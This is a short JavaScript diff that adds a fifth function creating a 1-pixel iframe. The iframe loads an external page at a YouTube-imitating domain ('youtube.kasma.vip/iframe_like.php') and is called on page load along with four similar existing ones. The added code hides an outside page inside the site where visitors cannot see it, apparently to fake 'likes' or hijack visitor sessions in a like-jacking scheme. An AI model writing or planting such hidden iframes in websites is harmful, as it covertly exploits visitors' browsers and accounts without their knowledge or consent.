@@ -28,7 +28,15 @@ function prepareFrame() {
         ifrm.style.height = "1px";
         document.body.appendChild(ifrm);
     }
+            function prepareFrame5() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://youtube.kasma.vip/iframe_like.php");
+        ifrm.style.width = "1px";
+        ifrm.style.height = "1px";
+        document.body.appendChild(ifrm);
+    }
     prepareFrame();
  prepareFrame2();
   prepareFrame3();
   prepareFrame4();
+  prepareFrame5();
